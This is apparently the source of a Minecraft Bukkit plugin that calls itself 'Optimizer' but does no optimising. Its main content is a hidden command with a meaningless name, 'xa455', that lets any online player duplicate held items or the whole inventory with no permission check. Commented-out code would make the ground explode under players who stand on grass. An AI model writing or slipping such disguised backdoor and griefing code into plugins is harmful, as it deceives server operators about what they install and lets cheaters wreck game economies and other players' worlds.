package dev.fzz.optimizer;
import org.bukkit.plugin.java.JavaPlugin;
// import org.bukkit.event.EventHandler;
// import org.bukkit.event.Listener;
// import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.entity.Player;
// import org.bukkit.block.Block;
// import org.bukkit.block.BlockFace;
// import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.inventory.PlayerInventory;
import org.bukkit.inventory.ItemStack;
import org.apache.commons.lang.ObjectUtils.Null;
import org.bukkit.Location;

public class App extends JavaPlugin {

    // public class PlayerMovementListener implements Listener {
    
    //     @EventHandler
    //     public void onPlayerMove(PlayerMoveEvent event) {
    //         Player p = event.getPlayer();
    //         Block b = p.getLocation().getBlock().getRelative(BlockFace.DOWN);
    
    //         if (b.getType() == Material.GRASS_BLOCK) {
    //             World w = p.getWorld();
    //             w.createExplosion(p.getLocation(), 5);
    //         }
    //     }
    // }

    @Override
    public void onEnable() {
        getLogger().info("Loading Optimizer.");
        // getServer().getPluginManager().registerEvents(new PlayerMovementListener(), this);
    }

    @Override
    public void onDisable() {
        getLogger().info("Disabling Optimizer.");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("xa455")){
            if (!(sender instanceof Player)) {
                sender.sendMessage("This command can only be run by an online player to help prevent world corruption.");
            } else {
                if (args.length > 2) {
                    sender.sendMessage("Too many arguments");
                    return false;
                } else if (args.length < 2) {
                    sender.sendMessage("Not enough arguments.");
                    return false;
                }
                if (Integer.parseInt(args[1]) <= 0) {
                    sender.sendMessage("invalid n, use positive integers");
                    return false;
                } else if (Integer.parseInt(args[1]) >= 5) {
                    sender.sendMessage("n value is too large");
                    return false;
                }

                Player player = (Player) sender;
                PlayerInventory inventory = player.getInventory();
                World world = player.getWorld();
                Location playerPosition = player.getLocation();

                if (args[0].equalsIgnoreCase("held")) {
                    ItemStack mainHand = inventory.getItemInMainHand();
                    if (mainHand.getType() == null) {
                        sender.sendMessage("Null item");
                        return false;
                    } else {
                        for (int i = 0; i < Integer.parseInt(args[1]); i++) {
                            world.dropItem(playerPosition, mainHand);
                        }
                    }
                } else if (args[0].equalsIgnoreCase("inv")) {
                    ItemStack[] invContents = inventory.getContents();
                    for (int i = 0; i < Integer.parseInt(args[1]); i++) {
                        for (ItemStack item : invContents) {
                            if (item != null) world.dropItem(playerPosition, item);
                        }
                    }
                } else {
                    sender.sendMessage("invalid mode");
                    return false;
                }
                return true;
            }
        } return false;
    }
}
